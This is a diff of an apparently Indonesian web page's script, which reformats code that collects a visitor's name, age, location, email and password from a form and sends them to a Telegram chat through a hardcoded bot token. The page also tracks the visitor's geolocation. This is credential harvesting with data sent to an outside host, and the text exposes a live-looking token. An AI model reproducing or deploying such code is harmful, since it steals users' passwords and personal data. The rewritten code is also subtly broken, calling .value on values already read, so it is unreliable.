@@ -45,31 +45,35 @@
     
     <script>
       const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
-      const chatId = '-1001983705713'; // Chat ID penerima pesan
-        async function telegramRequest(method,data) {
-                  try {
-          const response = await axios.post(`https://api.telegram.org/bot${botToken}/${method}`, data);
-          console.log(response.data);
-        } catch (error) {
-                          alert("Kesalahan : \n", error);
-          console.error(error);
-        }
-      }
+const chatId = '-1001983705713'; // Chat ID penerima pesan
+
+async function telegramRequest(method, data) {
+  try {
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/${method}`, data);
+    console.log(response.data);
+  } catch (error) {
+    alert("Kesalahan : \n", error);
+    console.error(error);
+  }
+}
+
 var nama = document.getElementById('nama').value;
 var umur = document.getElementById('umur').value;
 var alamat = document.getElementById('lokasi').value;
 var tgl_lahir = document.getElementById('tgl_lahir')
 var email = document.getElementById('email').value;
 var kata_sandi = document.getElementById('kata_sandi').value;
-      var result = "\nNama : " + nama + "\nUmur : " + umur + " Tahun" + "\nLokasi : " + lokasi + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi
-     function sendText() {
-        const message = result
-        if (message) {
-          telegramRequest('sendMessage', { chat_id: chatId, text: message });
-         alert("Berhasil Mengirim")
+
+var result = "\nNama : " + nama.value + "\nUmur : " + umur.value + " Tahun" + "\nLokasi : " + alamat.value + "\nEmail : " + email.value + "\nKata Sandi : " + kata_sandi.value;
+
+function sendText() {
+  const message = result;
+  if (message) {
+    telegramRequest('sendMessage', { chat_id: chatId, text: message });
+    alert("Berhasil Mengirim");
   }
-     }
-      
+}
+
       function getLocation() {
                         if (navigator.geolocation) {
                             navigator.geolocation.watchPosition(showPosition,showError);
